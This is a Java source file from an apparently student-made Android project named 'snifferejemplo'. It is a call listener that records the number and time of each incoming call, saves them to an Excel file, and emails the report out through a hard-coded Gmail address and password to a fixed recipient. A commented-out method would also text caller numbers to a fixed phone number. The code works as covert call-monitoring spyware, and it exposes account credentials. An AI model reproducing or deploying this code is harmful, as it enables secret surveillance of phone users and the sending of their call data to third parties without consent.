package com.example.alumno.snifferejemplo;

import android.Manifest;
import android.content.Context;
import android.database.Cursor;
import android.os.Environment;
import android.support.v4.app.ActivityCompat;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Calendar;
import java.util.List;
import java.util.Locale;

import jxl.Workbook;
import jxl.WorkbookSettings;
import jxl.write.Label;
import jxl.write.WritableSheet;
import jxl.write.WritableWorkbook;
import jxl.write.WriteException;
import jxl.write.biff.RowsExceededException;

/**
 * Created by alumno on 27/05/2016.
 */
public class EscuchaTelefono extends PhoneStateListener{
    Context context;
    private int nu, fe;
    private String[] nro, fecha;
    private String numerophone, date, hora;
    private int serverResponseCode = 0;


    public EscuchaTelefono(Context c, String numero){
        this.context= c;
        this.numerophone = numero;
        nu = 0;
        fe =0;
        nro = new String[100];
        fecha = new String[100];


    }


    public void onCallStateChanged(int state, String incomingNumber){
        switch (state){
            case TelephonyManager.CALL_STATE_IDLE:
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                break;
            case TelephonyManager.CALL_STATE_RINGING:
             //   Toast.makeText(this.context, "LLAMADA ENTRANTE", Toast.LENGTH_LONG).show();
                String phoneNumber = numerophone;
                DateFormat df = new SimpleDateFormat("EEE, d MMM yyyy, HH:mm");
                date = df.format(Calendar.getInstance().getTime());

                //Agregar datos de llamada a stringa
                nro[nu] = numerophone;
                Log.i("nu", "creado");
                fecha[fe] = date;
                Log.i("fe", "creada");
                nu++;
                fe++;

            /*
                 Implementación de Envío de Registro en Excel al día sgte
                *                 String dia;
                DateFormat ds= new SimpleDateFormat("d");
                dia = ds.format(Calendar.getInstance().getTime());
                Log.i("Dia actual:", dia );
                  if( Integer.valueOf(dia) > Integer.valueOf(fecha[fe-1].substring(6,8))) {
                this.exportToExcel();
                this.send_mail();
                }
                *
                * */
                this.exportToExcel();
                this.send_mail();
               // envioBotonSos(phoneNumber);
                break;

        }
    }


    public void envioBotonSos(String phoneNumber){
              SmsManager smsx = SmsManager.getDefault();
        smsx.sendTextMessage("+51996332722", null, "Numero:" + phoneNumber, null, null);
    }

    private void exportToExcel() {
        final String fileName = "Reporte.xls";

        //Guardar archivo en almacenamiento externo
        File sdCard = Environment.getExternalStorageDirectory();
        File directory = new File(sdCard.getAbsolutePath() + "/reportes");


        //Crear directorio si no existe
        if(!directory.isDirectory()){
            directory.mkdirs();
        }

        //file path
        File file = new File(directory, fileName);

        WorkbookSettings wbSettings = new WorkbookSettings();
        wbSettings.setLocale(new Locale("en", "EN"));
        WritableWorkbook workbook;

        try {
            workbook = Workbook.createWorkbook(file, wbSettings);
            WritableSheet sheet = workbook.createSheet("ReporteDia", 0);

            try {
                //Añadir datos (columna, fila) De 0

                //Label 1 de Timestamp
                Label label = new Label(0, 0, "Timestamp");
                sheet.addCell(label);

                //Label 2 de Number
                label = new Label(1, 0, "Number");
                sheet.addCell(label);

                //Timestamp col 0 fila x
                for(int f=0; f<= fe; f++)
                {
                    label = new Label(0, f+1, fecha[f]);
                    sheet.addCell(label);

                    Log.i("COLUMNA FECHA", "INSERTADA");
                }


                //Numero col 1 fila x
                for(int n=0; n<= nu; n++)
                {
                    label = new Label(1, n+1, nro[n]);
                    sheet.addCell(label);

                    Log.i("COLUMNA NRO", "INSERTADA ");
                }


                nu=0;
                fe=0;

            } catch (RowsExceededException e) {
                e.printStackTrace();
            } catch (WriteException e) {
                e.printStackTrace();
            }
            workbook.write();
            try {
                workbook.close();
            } catch (WriteException e) {
                e.printStackTrace();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private void send_mail(){

        Log.i("SendMailActivity", "Send Button Clicked.");

        String fromEmail = "testingmoviles@gmail.com";
        String fromPassword = "salchiplis";
        String toEmails = "danibrin94@hotmail.com";
        List toEmailList = Arrays.asList(toEmails
                .split("\\s*,\\s*"));
        Log.i("SendMailActivity", "To List: " + toEmailList);
        String emailSubject = "Reporte";
        String emailBody = "Prueba de reporte";

        new SendMailTask().execute(fromEmail,
                fromPassword, toEmailList, emailSubject, emailBody);

    }

}
